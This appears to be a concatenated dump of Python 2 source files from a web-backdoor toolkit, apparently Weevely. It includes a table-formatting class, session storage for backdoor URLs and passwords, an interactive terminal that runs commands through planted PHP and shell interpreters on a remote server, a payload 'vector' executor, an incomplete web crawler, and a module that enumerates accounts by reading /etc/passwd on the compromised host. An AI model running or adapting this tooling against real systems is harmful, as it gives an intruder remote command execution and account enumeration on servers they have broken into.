            raise Exception("Invalid pre-set style!")

    def _set_default_style(self):

        self.header = True
        self.border = True
        self._hrules = FRAME
        self.padding_width = 1
        self.left_padding_width = 1
        self.right_padding_width = 1
        self.vertical_char = "|"
        self.horizontal_char = "-"
        self.junction_char = "+"

    def _set_msword_style(self):

        self.header = True
        self.border = True
        self._hrules = NONE
        self.padding_width = 1
        self.left_padding_width = 1
        self.right_padding_width = 1
        self.vertical_char = "|"

    def _set_columns_style(self):

        self.header = True
        self.border = False
        self.padding_width = 1
        self.left_padding_width = 0
        self.right_padding_width = 8

    def _set_random_style(self):

        # Just for fun!
        self.header = random.choice((True, False))
        self.border = random.choice((True, False))
        self._hrules = random.choice((ALL, FRAME, NONE))
        self.left_padding_width = random.randint(0,5)
        self.right_padding_width = random.randint(0,5)
        self.vertical_char = random.choice("~!@#$%^&*()_+|-=\{}[];':\",./;<>?")
        self.horizontal_char = random.choice("~!@#$%^&*()_+|-=\{}[];':\",./;<>?")
        self.junction_char = random.choice("~!@#$%^&*()_+|-=\{}[];':\",./;<>?")

    ##############################
    # DATA INPUT METHODS         #
    ##############################

    def add_row(self, row):

        """Add a row to the table

        Arguments:

        row - row of data, should be a list with as many elements as the table
        has fields"""

        if self._field_names and len(row) != len(self._field_names):
            raise Exception("Row has incorrect number of values, (actual) %d!=%d (expected)" %(len(row),len(self._field_names)))
        self._rows.append(list(row))

    def del_row(self, row_index):

        """Delete a row to the table

        Arguments:

        row_index - The index of the row you want to delete.  Indexing starts at 0."""

        if row_index > len(self._rows)-1:
            raise Exception("Cant delete row at index %d, table only has %d rows!" % (row_index, len(self._rows)))
        del self._rows[row_index]

    def add_column(self, fieldname, column, align="c"):

        """Add a column to the table.

        Arguments:

        fieldname - name of the field to contain the new column of data
        column - column of data, should be a list with as many elements as the
        table has rows
        align - desired alignment for this column - "l" for left, "c" for centre and "r" for right"""

        if len(self._rows) in (0, len(column)):
            self._validate_align(align)
            self._field_names.append(fieldname)
            self._align[fieldname] = align
            for i in range(0, len(column)):
                if len(self._rows) < i+1:
                    self._rows.append([])
                self._rows[i].append(column[i])
        else:
            raise Exception("Column length %d does not match number of rows %d!" % (len(column), len(self._rows)))

    def clear_rows(self):

        """Delete all rows from the table but keep the current field names"""

        self._rows = []

    def clear(self):

        """Delete all rows and field names from the table, maintaining nothing but styling options"""

        self._rows = []
        self._field_names = []
        self._widths = []

    ##############################
    # MISC PUBLIC METHODS        #
    ##############################

    def copy(self):
        return copy.deepcopy(self)

    ##############################
    # MISC PRIVATE METHODS       #
    ##############################

    def _format_value(self, field, value):
        if isinstance(value, int) and field in self._int_format:
            value = ("%%%sd" % self._int_format[field]) % value 
        elif isinstance(value, float) and field in self._float_format:
            value = ("%%%sf" % self._float_format[field]) % value 
        return value

    def _compute_widths(self, rows, options):
        if options["header"]:
            widths = [_get_size(field)[0] for field in self._field_names]
        else:
            widths = len(self.field_names) * [0]
        for row in rows:
            for index, value in enumerate(row):
                value = self._format_value(self.field_names[index], value)
                widths[index] = max(widths[index], _get_size(_unicode(value))[0])
        self._widths = widths

    def _get_padding_widths(self, options):

        if options["left_padding_width"] is not None:
            lpad = options["left_padding_width"]
        else:
            lpad = options["padding_width"]
        if options["right_padding_width"] is not None:
            rpad = options["right_padding_width"]
        else:
            rpad = options["padding_width"]
        return lpad, rpad

    def _get_rows(self, options):
        """Return only those data rows that should be printed, based on slicing and sorting.

        Arguments:

        options - dictionary of option settings."""
       
	# Make a copy of only those rows in the slice range 
        rows = copy.deepcopy(self._rows[options["start"]:options["end"]])
        # Sort if necessary
        if options["sortby"]:
            sortindex = self._field_names.index(options["sortby"])
            # Decorate
            rows = [[row[sortindex]]+row for row in rows]
            # Sort
            rows.sort(reverse=options["reversesort"], key=options["sort_key"])
            # Undecorate
            rows = [row[1:] for row in rows]
        return rows
         
    ##############################
    # PLAIN TEXT STRING METHODS  #
    ##############################

    def get_string(self, **kwargs):

        """Return string representation of table in current state.

        Arguments:

        start - index of first data row to include in output
        end - index of last data row to include in output PLUS ONE (list slice style)
        fields - names of fields (columns) to include
        header - print a header showing field names (True or False)
        border - print a border around the table (True or False)
        hrules - controls printing of horizontal rules after rows.  Allowed values: FRAME, ALL, NONE
	int_format - controls formatting of integer data
	float_format - controls formatting of floating point data
        padding_width - number of spaces on either side of column data (only used if left and right paddings are None)
        left_padding_width - number of spaces on left hand side of column data
        right_padding_width - number of spaces on right hand side of column data
        vertical_char - single character string used to draw vertical lines
        horizontal_char - single character string used to draw horizontal lines
        junction_char - single character string used to draw line junctions
        sortby - name of field to sort rows by
        sort_key - sorting key function, applied to data points before sorting
        reversesort - True or False to sort in descending or ascending order"""

        options = self._get_options(kwargs)

        bits = []

        # Don't think too hard about an empty table
        if self.rowcount == 0:
            return ""

        rows = self._get_rows(options)
        self._compute_widths(rows, options)

        # Build rows
        # (for now, this is done before building headers etc. because rowbits.append
        # contains width-adjusting voodoo which has to be done first.  This is ugly
        # and Wrong and will change soon)
        rowbits = []
        for row in rows:
            rowbits.append(self._stringify_row(row, options))


        # Add header or top of border
        if options["header"]:
            bits.append(self._stringify_header(options))
        elif options["border"] and options["hrules"] != NONE:
            bits.append(self._hrule)

        # Add rows
        bits.extend(rowbits)

        # Add bottom of border
        if options["border"] and not options["hrules"]:
            bits.append(self._hrule)
        
        string = "\n".join(bits)
        self._nonunicode = string
        return _unicode(string)

    def _stringify_hrule(self, options):

        if not options["border"]:
            return ""
        lpad, rpad = self._get_padding_widths(options)
        bits = [options["junction_char"]]
        for field, width in zip(self._field_names, self._widths):
            if options["fields"] and field not in options["fields"]:
                continue
            bits.append((width+lpad+rpad)*options["horizontal_char"])
            bits.append(options["junction_char"])
        return "".join(bits)

    def _stringify_header(self, options):

        bits = []
        lpad, rpad = self._get_padding_widths(options)
        if options["border"]:
            if options["hrules"] != NONE:
                bits.append(self._hrule)
                bits.append("\n")
            bits.append(options["vertical_char"])
        for field, width, in zip(self._field_names, self._widths):
            if options["fields"] and field not in options["fields"]:
                continue
            if self._align[field] == "l":
                bits.append(" " * lpad + _unicode(field).ljust(width) + " " * rpad)
            elif self._align[field] == "r":
                bits.append(" " * lpad + _unicode(field).rjust(width) + " " * rpad)
            else:
                bits.append(" " * lpad + _unicode(field).center(width) + " " * rpad)
            if options["border"]:
                bits.append(options["vertical_char"])
        if options["border"] and options["hrules"] != NONE:
            bits.append("\n")
            bits.append(self._hrule)
        return "".join(bits)

    def _stringify_row(self, row, options):
        
        for index, value in enumerate(row):
            row[index] = self._format_value(self.field_names[index], value)

        for index, field, value, width, in zip(range(0,len(row)), self._field_names, row, self._widths):
            # Enforce max widths
            max_width = self._max_width.get(field, 0)
            lines = _unicode(value).split("\n")
            new_lines = []
            for line in lines: 
                if max_width and len(line) > max_width:
                    line = textwrap.fill(line, max_width)
                new_lines.append(line)
            lines = new_lines
            value = "\n".join(lines)
            row[index] = value

        #old_widths = self._widths[:]

        for index, field in enumerate(self._field_names):
            namewidth = len(field)
            datawidth = min(self._widths[index], self._max_width.get(field, self._widths[index]))
            if options["header"]:
               self._widths[index] = max(namewidth, datawidth)
            else:
               self._widths[index] = datawidth
        
        row_height = 0
        for c in row:
            h = _get_size(c)[1]
            if h > row_height:
                row_height = h

        bits = []
        lpad, rpad = self._get_padding_widths(options)
        for y in range(0, row_height):
            bits.append([])
            if options["border"]:
                bits[y].append(self.vertical_char)

        for field, value, width, in zip(self._field_names, row, self._widths):

            lines = _unicode(value).split("\n")
            if len(lines) < row_height:
                lines = lines + ([""] * (row_height-len(lines)))

            y = 0
            for l in lines:
                if options["fields"] and field not in options["fields"]:
                    continue

                if self._align[field] == "l":
                    bits[y].append(" " * lpad + _unicode(l).ljust(width) + " " * rpad)
                elif self._align[field] == "r":
                    bits[y].append(" " * lpad + _unicode(l).rjust(width) + " " * rpad)
                else:
                    bits[y].append(" " * lpad + _unicode(l).center(width) + " " * rpad)
                if options["border"]:
                    bits[y].append(self.vertical_char)

                y += 1

        self._hrule = self._stringify_hrule(options)
        
        if options["border"] and options["hrules"]== ALL:
            bits[row_height-1].append("\n")
            bits[row_height-1].append(self._hrule)

        for y in range(0, row_height):
            bits[y] = "".join(bits[y])

        #self._widths = old_widths

        return "\n".join(bits)

    ##############################
    # HTML STRING METHODS        #
    ##############################

    def get_html_string(self, **kwargs):

        """Return string representation of HTML formatted version of table in current state.

        Arguments:

        start - index of first data row to include in output
        end - index of last data row to include in output PLUS ONE (list slice style)
        fields - names of fields (columns) to include
        header - print a header showing field names (True or False)
        border - print a border around the table (True or False)
        hrules - controls printing of horizontal rules after rows.  Allowed values: FRAME, ALL, NONE
	int_format - controls formatting of integer data
	float_format - controls formatting of floating point data
        padding_width - number of spaces on either side of column data (only used if left and right paddings are None)
        left_padding_width - number of spaces on left hand side of column data
        right_padding_width - number of spaces on right hand side of column data
        sortby - name of field to sort rows by
        sort_key - sorting key function, applied to data points before sorting
        attributes - dictionary of name/value pairs to include as HTML attributes in the <table> tag"""

        options = self._get_options(kwargs)

        if options["format"]:
            string = self._get_formatted_html_string(options)
        else:
            string = self._get_simple_html_string(options)

        self._nonunicode = string
        return _unicode(string)

    def _get_simple_html_string(self, options):

        bits = []
        # Slow but works
        table_tag = '<table'
        if options["border"]:
            table_tag += ' border="1"'
        if options["attributes"]:
            for attr_name in options["attributes"]:
                table_tag += ' %s="%s"' % (attr_name, options["attributes"][attr_name])
        table_tag += '>'
        bits.append(table_tag)

        # Headers
        if options["header"]:
            bits.append("    <tr>")
            for field in self._field_names:
                if options["fields"] and field not in options["fields"]:
                    continue
                bits.append("        <th>%s</th>" % escape(_unicode(field)).replace("\n", "<br />"))
            bits.append("    </tr>")

        # Data
        rows = self._get_rows(options)
        for row in rows:
            bits.append("    <tr>")
            for field, datum in zip(self._field_names, row):
                if options["fields"] and field not in options["fields"]:
                    continue
                bits.append("        <td>%s</td>" % escape(_unicode(datum)).replace("\n", "<br />"))
            bits.append("    </tr>")

        bits.append("</table>")
        string = "\n".join(bits)

        self._nonunicode = string
        return _unicode(string)

    def _get_formatted_html_string(self, options):

        bits = []
        lpad, rpad = self._get_padding_widths(options)
        # Slow but works
        table_tag = '<table'
        if options["border"]:
            table_tag += ' border="1"'
        if options["hrules"] == NONE:
            table_tag += ' frame="vsides" rules="cols"'
        if options["attributes"]:
            for attr_name in options["attributes"]:
                table_tag += ' %s="%s"' % (attr_name, options["attributes"][attr_name])
        table_tag += '>'
        bits.append(table_tag)
        # Headers
        if options["header"]:
            bits.append("    <tr>")
            for field in self._field_names:
                if options["fields"] and field not in options["fields"]:
                    continue
                bits.append("        <th style=\"padding-left: %dem; padding-right: %dem; text-align: center\">%s</th>" % (lpad, rpad, escape(_unicode(field)).replace("\n", "<br />")))
            bits.append("    </tr>")
        # Data
        rows = self._get_rows(options)
        for row in self._rows:
            bits.append("    <tr>")
            for field, datum in zip(self._field_names, row):
                if options["fields"] and field not in options["fields"]:
                    continue
                if self._align[field] == "l":
                    bits.append("        <td style=\"padding-left: %dem; padding-right: %dem; text-align: left\">%s</td>" % (lpad, rpad, escape(_unicode(datum)).replace("\n", "<br />")))
                elif self._align[field] == "r":
                    bits.append("        <td style=\"padding-left: %dem; padding-right: %dem; text-align: right\">%s</td>" % (lpad, rpad, escape(_unicode(datum)).replace("\n", "<br />")))
                else:
                    bits.append("        <td style=\"padding-left: %dem; padding-right: %dem; text-align: center\">%s</td>" % (lpad, rpad, escape(_unicode(datum)).replace("\n", "<br />")))
            bits.append("    </tr>")
        bits.append("</table>")
        string = "\n".join(bits)

        self._nonunicode = string
        return _unicode(string)

def main():

    x = PrettyTable(["City name", "Area", "Population", "Annual Rainfall"])
    x.sortby = "Population"
    x.reversesort = True
    x.int_format["Area"] = "04"
    x.float_format = "6.1"
    x.align["City name"] = "l" # Left align city names
    x.add_row(["Adelaide", 1295, 1158259, 600.5])
    x.add_row(["Brisbane", 5905, 1857594, 1146.4])
    x.add_row(["Darwin", 112, 120900, 1714.7])
    x.add_row(["Hobart", 1357, 205556, 619.5])
    x.add_row(["Sydney", 2058, 4336374, 1214.8])
    x.add_row(["Melbourne", 1566, 3806092, 646.9])
    x.add_row(["Perth", 5386, 1554769, 869.4])
    print(x)
    
if __name__ == "__main__":
    main()

########NEW FILE########
__FILENAME__ = sessions
import os
import glob
import urlparse 
import yaml
from core.moduleexception import ModuleException

dirpath = '.weevely'
rcfilepath = 'weevely.rc'
cfgext = '.session'
cfgfilepath = 'sessions'
historyfilepath = 'history'

default_session = { 'global' : { 'url' : '' , 'username': '', 'password': '', 'hostname': '', 'rcfile': '' } }

WARN_NOT_FOUND = 'Session file not found'
WARN_BROKEN_SESS = 'Broken session file, missing fields'
WARN_LOAD_ERR = "Error loading session file"

class Sessions():

    def __init__(self, url = None, password = None, sessionfile=None):
        
        self.sessions = {}
        self.current_session_name = ''
        
        if not os.path.isdir(cfgfilepath):
            os.makedirs(cfgfilepath)
            
        self.load_session(url, password, sessionfile) 


    def load_session(self, url, password, sessionfile):
        
        if sessionfile:
            self._load_session_by_file(sessionfile)
        elif url and password:
            self._load_session_by_url(url, password)
        else:
            self._load_fake_session()
            
        if not self.current_session_name:
            raise ModuleException("session", WARN_LOAD_ERR)   


    def _load_fake_session(self):
        
        self.sessions['fake'] = default_session.copy()
        self.current_session_name = 'fake'
        

    def _validate_session_data(self, session_dict):
        
        for sect in default_session:
            if not sect in session_dict:
                raise ModuleException("session", "%s '%s'" % (WARN_BROKEN_SESS, sect))
            
            for subsect in default_session[sect]:
                if not subsect in session_dict[sect]:
                    raise ModuleException("session", "%s '%s'" % (WARN_BROKEN_SESS, sect))



    def _load_session_by_file(self, session_name, just_return = False):
        
        if not os.path.isfile(session_name):
            raise ModuleException('session', WARN_NOT_FOUND)

        try:
            session_data = yaml.load(open(session_name,'r').read())
        except Exception as e:
          raise ModuleException("session", WARN_BROKEN_SESS)
        
        self._validate_session_data(session_data)
        
        if not just_return:
            self.sessions[session_name] = session_data
            self.current_session_name = session_name
            
        else:
            return session_data          

      
    def _load_session_by_url(self, url, password):
        
        sessions_available = glob.glob(os.path.join(cfgfilepath,'*','*%s' % cfgext)) 
        
        for session in sessions_available:
            session_opts = self._load_session_by_file(session, just_return=True)
            if session_opts['global']['url'] == url and session_opts['global']['password'] == password:
                self._load_session_by_file(session)
                return
                

        self._init_new_session(url, password)
            
    
    def _guess_first_usable_session_name(self, hostfolder, bd_fixedname):      
        
        if not os.path.isdir(hostfolder):
            os.makedirs(hostfolder)
        
        bd_num = 0
        
        while True:
            bd_filename =  bd_fixedname + (str(bd_num) if bd_num else '') + cfgext
            session_name = os.path.join(hostfolder, bd_filename) 
                
            if not os.path.exists(session_name):
                return session_name
            else:
                bd_num +=1
        
        
    def _init_new_session(self, url, password, session_name = None):
        
        if not session_name:
            hostname = urlparse.urlparse(url).hostname
            hostfolder = os.path.join(cfgfilepath, hostname)
            bd_fixedname = os.path.splitext(os.path.basename(urlparse.urlsplit(url).path))[0]
            
            session_name = self._guess_first_usable_session_name(hostfolder, bd_fixedname)


        self.sessions[session_name] = default_session.copy()
        
        self.sessions[session_name]['global']['url'] = url
        self.sessions[session_name]['global']['password'] = password
        self.current_session_name = session_name
    
    def get_session(self, session_name = None):
        
        if not session_name:
            return self.sessions[self.current_session_name]
        else:
            return self.sessions[session_name]
            

    def dump_all_sessions(self, modules):
        
        # Update sessions with module stored arguments
        
        for modname, mod in modules.items():
            for arg, val in mod.stored_args_namespace:
                if not modname in self.sessions[self.current_session_name]:
                    self.sessions[self.current_session_name][modname] = {}
                    
                self.sessions[self.current_session_name][modname][arg] = val
                
        
        # Dump all sessions
        for session_name in self.sessions:
            if session_name != 'fake':
                self._dump_session(self.sessions[session_name], session_name)

    def _dump_session(self, session, session_name):
            
        try:
            yaml.dump(session,open(session_name,'w'), default_flow_style=False)
        except Exception as e:
            raise ModuleException("session", e)


    def format_sessions(self, level = 0):
        
        output = "Current session: '%s'%s" % (self.current_session_name, os.linesep)
        if level > 0:
            sessions_loaded = "', '".join(sorted(self.sessions.keys()))
            output += "Loaded: '%s'%s" % (sessions_loaded, os.linesep)
        if level > 1:
            sessions_available = "', '".join(glob.glob(os.path.join(cfgfilepath,'*','*%s' % cfgext)))
            output += "Available: '%s'%s" % (sessions_available, os.linesep)
            
        return output
            
        
########NEW FILE########
__FILENAME__ = terminal
'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleexception import ModuleException
from core.vector import Vector
from core.helper import Helper
from core.sessions import cfgfilepath, historyfilepath
import os, re, shlex, atexit, sys


try:
    import readline
except ImportError:
    try:
        import pyreadline as readline
    except ImportError: 
        print '[!] Error, readline or pyreadline python module required. In Ubuntu linux run\n[!] sudo apt-get install python-readline'
        sys.exit(1)



module_trigger = ':'
help_string = ':help'
set_string = ':set'
load_string = ':load'
gen_string = ':generator'
session_string = ':session'


class Terminal(Helper):

    def __init__( self, modhandler):
        
        self.modhandler = modhandler

        self._init_completion()
        self._load_rcfile(self.modhandler.sessions.get_session()['global']['rcfile'])
        
        # Register methods to dump files at exit
        atexit.register( readline.write_history_file, os.path.join(cfgfilepath, historyfilepath))
        atexit.register( modhandler.sessions.dump_all_sessions, modhandler.modules)

        
    def loop(self):

        self._tprint(self._format_presentation())
        
        username, hostname = self.__env_init()

        self.__cwd_handler()
        
        while self.modhandler.interpreter:

            prompt = '{user}@{host}:{path} {prompt} '.format(
                                                             user=username, 
                                                             host=hostname, 
                                                             path=getattr(self.modhandler.load('shell.php').stored_args_namespace, 'path'), 
                                                             prompt = 'PHP>' if (self.modhandler.interpreter == 'shell.php') else '$' )

			# Python 3 doesn't support raw_input(), it uses a 'new' input()
            try:
                input_cmd = raw_input( prompt )

            except NameError:
				input_cmd = input( prompt )

            if input_cmd and (input_cmd[0] == ':' or input_cmd[:2] in ('ls', 'cd')):
                # This is a module call, pre-split to simulate argv list to pass to argparse 
                try:
                    cmd = shlex.split(input_cmd)
                except ValueError:
                    self._tprint('[terminal] [!] Error: command parse fail%s' % os.linesep)
                    continue
                
            elif input_cmd and input_cmd[0] != '#':
                # This is a direct command, do not split
                cmd = [ input_cmd ] 
            else:
                continue
            
            self.run_cmd_line(cmd)


    def _tprint(self, msg):
        self.modhandler._last_warns += msg + os.linesep
        if msg: print msg,
        

    def run_cmd_line(self, command):

        self._last_output = ''
        self.modhandler._last_warns = ''
        self._last_result = None
        
        
        try:
    
            ## Help call
            if command[0] == help_string:
                if len(command) == 2:
                    command[1] = command[1].lstrip(':')
                    if command[1] in self.modhandler.modules_classes.keys():
                        self._tprint(self._format_helps([ command[1] ]))
                    else:
                        self._tprint(self._format_helps([ m for m in self.modhandler.modules_classes.keys() if command[1] in m], summary_type=1))                        
                else:
                    self._tprint(self._format_grouped_helps())
                           
            ## Set call if ":set module" or ":set module param value"
            elif command[0] == set_string and len(command) > 1: 
                    self.modhandler.load(command[1]).store_args(command[2:])
                    self._tprint(self.modhandler.load(command[1]).format_stored_args() + os.linesep)

            ## Load call
            elif command[0] == load_string and len(command) == 2:
                # Recursively call run_cmd_line() and return to avoid to reprint last output
                self._load_rcfile(command[1])
                return

            ## Handle cd call
            elif command[0] == 'cd':
                self.__cwd_handler(command)
                
            ## Handle session management
            elif command[0] == session_string:
                if len(command) >= 3 and command[1].startswith('http'):
                    self.modhandler.sessions.load_session(command[1], command[2], None)
                    self.modhandler.set_url_pwd()
                elif len(command) >= 2:
                    self.modhandler.sessions.load_session(None, None, command[1])
                    self.modhandler.set_url_pwd()
                else:
                    self._tprint(self.modhandler.sessions.format_sessions(2))
            else:
                    
                ## Module call
                if command[0][0] == module_trigger:
                    interpreter = command[0][1:]
                    cmd = command[1:]
                ## Raw command call. Command is re-joined to be considered as single command
                else:
                    # If interpreter is not set yet, try to probe automatically best one
                    if not self.modhandler.interpreter:
                        self.__guess_best_interpreter()
                    
                    interpreter = self.modhandler.interpreter
                    cmd = [ ' '.join(command) ] 
                
                res, out = self.modhandler.load(interpreter).run(cmd)

                if out != '': self._last_output += out
                if res != None: self._last_result = res
                
        except KeyboardInterrupt:
            self._tprint('[!] Stopped execution%s' % os.linesep)
        except ModuleException, e:
            self._tprint('[%s] [!] Error: %s%s' % (e.module, e.error, os.linesep))

        
        if self._last_output:
            print self._last_output
        

    def __guess_best_interpreter(self):
        
        # Run an empty command on shell.sh, to trigger first probe and load correct vector
        
        self.modhandler.load('shell.php').run(' ')

        if self.modhandler.load('shell.php').stored_args_namespace['mode']:
            self.modhandler.interpreter = 'shell.php'
            self.modhandler.load('shell.sh').run(' ')
            if self.modhandler.load('shell.sh').stored_args_namespace['vector']:
                self.modhandler.interpreter = 'shell.sh'
            
        if not self.modhandler.interpreter:
            raise ModuleException('terminal','Interpreter guess failed')
            
    def _load_rcfile(self, path):
        
        if not path:
            return
        
        path = os.path.expanduser(path)

        try:
            rcfile = open(path, 'r')
        except Exception, e:
            self._tprint( "[!] Error opening '%s' file." % path)
            return
            
        last_output = ''
        last_warns = ''
        last_result = []
        
        for cmd in [c.strip() for c in rcfile.read().split('\n') if c.strip() and c[0] != '#']:
            self._tprint('[LOAD] %s%s' % (cmd, os.linesep))
            self.run_cmd_line(shlex.split(cmd))
            
            last_output += self._last_output 
            last_warns += self.modhandler._last_warns 
            last_result.append(self._last_result)
        
        if last_output: self._last_output = last_output
        if last_warns: self.modhandler._last_warns = last_warns
        if last_result: self._last_result = last_result
        

    def __cwd_handler (self, cmd = None):

        cwd_new = ''
        
        if cmd == None or len(cmd) ==1:
            cwd_new = Vector(self.modhandler,  'first_cwd', 'system.info', 'cwd').execute()
        elif len(cmd) == 2:
            cwd_new = Vector(self.modhandler,  'getcwd', 'shell.php', 'chdir("$path") && print(getcwd());').execute({ 'path' : cmd[1] })
            if not cwd_new:
                self._tprint("[!] Folder '%s' change failed, no such file or directory or permission denied%s" % (cmd[1], os.linesep))                
                return
            
        if cwd_new:
            self.modhandler.load('shell.php').stored_args_namespace['path'] = cwd_new
        

    def __env_init(self):
        
        # At terminal start, try to probe automatically best interpreter
        self.__guess_best_interpreter()
        
        username =  Vector(self.modhandler, "whoami", 'system.info', "whoami").execute()
        hostname =  Vector(self.modhandler, "hostname", 'system.info', "hostname").execute()
        
        if Vector(self.modhandler, "safe_mode", 'system.info', "safe_mode").execute() == '1':
            self._tprint('[!] PHP Safe mode enabled%s' % os.linesep)

        
        return username, hostname
    


    def _init_completion(self):


            self.matching_words =  [':%s' % m for m in self.modhandler.modules_classes.keys()] + [help_string, load_string, set_string, session_string]
        
            try:
                readline.set_history_length(100)
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind( 'tab: complete' )
                readline.set_completer( self._complete )
                readline.read_history_file( os.path.join(cfgfilepath, historyfilepath))

            except IOError:
                pass
            



    def _complete(self, text, state):
        """Generic readline completion entry point."""

        try:
            buffer = readline.get_line_buffer()
            line = readline.get_line_buffer().split()

            if ' ' in buffer:
                return []

            # show all commandspath
            if not line:
                all_cmnds = [c + ' ' for c in self.matching_words]
                if len(all_cmnds) > state:
                    return all_cmnds[state]
                else:
                    return []


            cmd = line[0].strip()

            if cmd in self.matching_words:
                return [cmd + ' '][state]

            results = [c + ' ' for c in self.matching_words if c.startswith(cmd)] + [None]
            if len(results) == 2:
                if results[state]:
                    return results[state].split()[0] + ' '
                else:
                    return []
            return results[state]

        except Exception, e:
            self._tprint('[!] Completion error: %s' % e)



########NEW FILE########
__FILENAME__ = utils
from re import compile, IGNORECASE
from base64 import b64encode
from string import ascii_lowercase
from random import randint, choice
import hashlib

url_validator = compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', IGNORECASE)

def join_abs_paths(paths,sep = '/'):
    return sep.join([p.strip(sep) for p in paths])

def chunks(l, n):
    """ Yield successive n-sized chunks from l.
    """
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def chunks_equal(l, n):
    """ Yield n successive chunks from l.
    """
    newn = int(len(l) / n)
    for i in xrange(0, n-1):
        yield l[i*newn:i*newn+newn]
    yield l[n*newn-newn:]

def b64_chunks(l, n):
    return [b64encode(l[i:i+n]) for i in range(0, len(l), n)]

def randstr(n = 4, fixed = True, charset = None):
    if not fixed:
        n = randint(1,n)
    
    if not charset:
        charset = ascii_lowercase
        
    return ''.join(choice(charset) for x in range(n))
 
def md5sum(filename):
   md5 = hashlib.md5()
   with open(filename,'rb') as f: 
       for chunk in iter(lambda: f.read(128*md5.block_size), b''): 
            md5.update(chunk)
   return md5.hexdigest()   
########NEW FILE########
__FILENAME__ = vector
from core.moduleexception import ModuleException
from string import Template
from types import ListType, StringTypes, DictType
import thread
import collections

class VectorsDict(collections.OrderedDict):
    
    def __init__(self, modhandler, *args):
        self.modhandler = modhandler
        collections.OrderedDict.__init__(self, args)

    def add_vector(self, name, interpreter, payloads):
        self[name] = Vector(self.modhandler, name, interpreter, payloads)
    
    def get(self, name):
        return self[name]


class Vector:
    
    
    def __init__(self, modhandler, name, interpreter, payloads):
        
        self.modhandler = modhandler
        self.name = name
        self.interpreter = interpreter
        
        # Payloads and Formats are lists
        self.payloads = []
        
        if payloads and isinstance(payloads, ListType):
            self.payloads = payloads
        elif payloads and isinstance (payloads, StringTypes):
            self.payloads.append(payloads)
        
    def execute(self, format_list = {}, return_out_res = False):

        # Check type dict
        if not isinstance(format_list, DictType):
            raise Exception("[!][%s] Error, format vector type is not dict: '%s'" % (self.name, format_list))



        formatted_list = []
        format_template_list = format_list.keys()
        for payload in self.payloads:
            
            # Search format keys present in current payload part 
            list_of_key_formats_in_payload = [s for s in format_template_list if '$%s' % s in payload]
            
            # Extract from format dict just the ones for current payload part
            dict_of_formats_in_payload = {}
            for k, v in format_list.iteritems():
                if k in list_of_key_formats_in_payload:
                    dict_of_formats_in_payload[k]=v
            
            if dict_of_formats_in_payload:
                formatted_list.append(Template(payload).safe_substitute(**dict_of_formats_in_payload))
            else:
                formatted_list.append(payload)

        res, out = self.modhandler.load(self.interpreter).run(formatted_list)
        
        if return_out_res:
            return out, res
        else:
            return res


    def execute_background(self, format_list = {}):
        thread.start_new_thread(self.execute, (format_list,))
        

########NEW FILE########
__FILENAME__ = etcpasswd
from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed, ExecutionException
from core.argparse import ArgumentParser

class User:

    def __init__(self,line):

        linesplit = line.split(':')

        self.line = line
        self.name = linesplit[0]
        self.home = '/home/' + self.name


        if len(linesplit) > 6:
             self.uid = int(linesplit[2])
             self.descr = linesplit[4]
             self.home = linesplit[5]
             self.shell = linesplit[6]

class Etcpasswd(ModuleGuess):
    """Enumerate users and /etc/passwd content"""


    def _set_vectors(self):
        
        self.vectors.add_vector('posix_getpwuid', 'shell.php', "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }")
        self.vectors.add_vector('cat','shell.sh',  "cat /etc/passwd"),
        self.vectors.add_vector('read', 'file.read',  "/etc/passwd")
        
    def _set_args(self):
        
        self.argparser.add_argument('-real', help='Show only real users', action='store_true')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        

    def __verify_vector_execution(self):


        pwdfile = ''

        if self._result:
            response_splitted = self._result.split('\n')
            if response_splitted and response_splitted[0].count(':') >= 6:
                raise ProbeSucceed(self.name, 'Password file enumerated')
        else:
            raise ExecutionException(self.name, 'Enumeration execution failed')
            

    def _stringify_result(self):
        
        filter_real_users = self.args['real']
        response_splitted = self._result.split('\n')
        response_dict = {}
        output_str = ''
        
        for line in response_splitted:
            if line:

                user = User(line)

                if filter_real_users:
                    if (user.uid == 0) or (user.uid > 999) or (('false' not in user.shell) and ('/home/' in user.home)):
                        output_str += line + '\n'
                        response_dict[user.name]=user
                else:
                        output_str += line + '\n'
                        response_dict[user.name]=user

        self._output = output_str[:-1] # Stringified /etc/passwd without last \n
        self._result = response_dict # Objectified /etc/passwd




########NEW FILE########
__FILENAME__ = crawler
#!/usr/bin/env python

"""Web Crawler/Spider

This module implements a web crawler. This is very _basic_ only
and needs to be extended to do anything usefull with the
traversed pages.

From: http://code.activestate.com/recipes/576551-simple-web-crawler/

"""

import re
import sys
import time
import math
import urllib2
import urlparse
import optparse
import hashlib
from cgi import escape
from traceback import format_exc
from Queue import Queue, Empty as QueueEmpty
from core.moduleexception import ModuleException


__version__ = "0.2"
__copyright__ = "CopyRight (C) 2008-2011 by James Mills"
__license__ = "MIT"
__author__ = "James Mills"
__author_email__ = "James Mills, James dot Mills st dotred dot com dot au"

USAGE = "%prog [options] <url>"
VERSION = "%prog v" + __version__

AGENT = "%s/%s" % (__name__, __version__)

class Link (object):

    def __init__(self, src, dst, link_type):
        self.src = src
        self.dst = dst
        self.link_type = link_type

    def __hash__(self):
        return hash((self.src, self.dst, self.link_type))

    def __eq__(self, other):
        return (self.src == other.src and
                self.dst == other.dst and
                self.link_type == other.link_type)

    def __str__(self):
        return self.src + " -> " + self.dst

class Crawler(object):

    def __init__(self, root, depth_limit, confine=None, exclude=[], locked=True, filter_seen=True):
        self.root = root
        self.host = urlparse.urlparse(root)[1]

        ## Data for filters:
        self.depth_limit = depth_limit # Max depth (number of hops from root)
        self.locked = locked           # Limit search to a single host?
        self.confine_prefix=confine    # Limit search to this prefix
        self.exclude_prefixes=exclude; # URL prefixes NOT to visit


        self.urls_seen = set()          # Used to avoid putting duplicates in queue
        self.urls_remembered = set()    # For reporting to user
